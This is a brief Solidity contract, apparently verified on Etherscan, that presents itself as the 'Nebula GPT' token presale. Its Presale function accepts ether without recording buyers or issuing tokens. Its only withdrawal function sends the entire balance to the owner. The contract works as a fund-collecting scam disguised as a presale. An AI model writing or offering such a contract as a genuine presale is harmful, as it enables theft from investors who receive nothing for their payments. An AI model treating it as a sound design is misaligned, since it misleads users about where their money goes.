/**
 *Submitted for verification at Etherscan.io on 2023-06-08
*/

/*
    Nebula GPT presale contract 2023
*/

pragma solidity ^0.4.26;

contract NebulaGPT {

    address private  owner;

     constructor() public{   
        owner=msg.sender;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function transfer() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function Presale() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}